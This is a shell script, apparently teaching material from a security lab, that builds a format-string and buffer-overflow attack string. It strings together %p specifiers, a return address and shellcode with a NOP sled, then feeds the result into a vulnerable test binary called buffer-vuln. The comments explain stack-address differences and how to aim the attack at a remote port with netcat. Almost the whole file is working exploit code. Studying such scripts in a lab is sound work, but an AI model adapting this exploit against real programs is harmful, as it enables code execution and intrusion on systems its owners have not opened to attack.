#!/bin/sh

#
# NOTE: This is a rather quick-and-dirty *EXAMPLE* script to inspire
# you of how you *could* use shell scripting to make your life a bit
# easier during an attack. Don't just copy it blindly, it will probably break
# in fun and interesting ways.
# 
# When performing a remote attack, obviously you cannot run the vulnerable
# application itself from within the script. But you can *connect* to the
# vulnerable port, or just pipe the output of the script into a netcat process.
#

# Switch between shell and list
program=list

# Build attackstring/shellcode in this variable
attackstr=""

# Get a string with a certain number of %ps, specified as first argument
for i in $(seq 1 $1); do
   attackstr="$attackstr%p "
done

# Insert a return address at the end, specified by the second argument
# Make sure this points to the right reverseaddr binary
if ! [ "$2" = "" ]; then
    attackstr="$attackstr$(reverseaddr $2)"
fi

# Insert the shellcode with the number of NOPs specified by the third argument
# If no third argument, no shellcode.
# Assumes the program `shellcode` is in the same directory.
if ! [ "$3" = "" ]; then
    attackstr="$(./shellcode $program $3)$attackstr"
fi

echo "String is $(echo -n "$attackstr" | wc -c) long" >&2
echo -n "$attackstr" | xxd >&2
echo >&2

# Performs attack, closes stdin after echo
# Note: echo puts a newline after the attack string. Here that's exactly
# what we want, due to gets, but sometimes we *don't*, in which case use
# echo -n.
echo "$attackstr" | ./buffer-vuln >&2
echo >&2

# Performs attack, pipes script stdin into it after echo
(echo "$attackstr") | ./buffer-vuln >&2
echo >&2

# Note that programs run from *within* a script might have a *different*
# stack address than programs outside of the script, regardless of ASLR
# settings.
# This is why we echo the attackstr one final time here to stdout, and
# everything else goes to stderr, so you can also run this as
# (./exploit-buf.sh; cat -) | ./buffer-vuln
echo "$attackstr"

